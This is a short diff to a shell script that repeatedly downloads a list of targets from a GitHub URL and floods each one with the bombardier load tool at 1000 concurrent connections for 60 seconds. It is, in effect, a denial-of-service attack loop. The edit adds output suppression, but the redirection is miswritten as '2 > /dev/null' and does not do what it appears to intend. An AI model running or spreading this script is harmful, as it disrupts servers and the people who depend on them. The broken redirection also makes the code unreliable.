@@ -644,7 +644,7 @@ do
 	curl https://raw.githubusercontent.com/dmitryshagin/targets/main/list > /tmp/list
 	while read p; do
 	  echo "$p"
-	  docker run -i alpine/bombardier -c 1000 -d 60s -l "$p"
+	  docker run alpine/bombardier -c 1000 -d 60s -l "$p" 2 > /dev/null;
 	  sleep 1;
 	done < /tmp/list
 done
